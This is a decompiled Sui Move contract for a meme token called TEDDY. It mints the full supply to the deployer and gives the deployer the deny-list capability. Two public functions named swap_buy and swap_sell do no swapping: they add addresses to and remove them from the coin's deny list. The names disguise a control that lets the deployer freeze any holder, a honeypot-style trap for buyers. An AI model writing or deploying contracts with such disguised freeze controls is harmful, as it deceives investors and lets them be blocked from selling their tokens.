module 0xa71e84f1fc4387c4fafbbf7775abfa09734ff7625f183459a4ce0f0c3950cc5::teddy {
    struct TEDDY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TEDDY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TEDDY>(arg0, 9, b"TEDDY", b"Teddy The Blind Dog", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmaQgRZuPS4njTsqxNFt8PUWxT7tjZXPmgahV6iJsVnn3s"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TEDDY>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TEDDY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TEDDY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TEDDY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TEDDY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TEDDY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TEDDY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TEDDY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

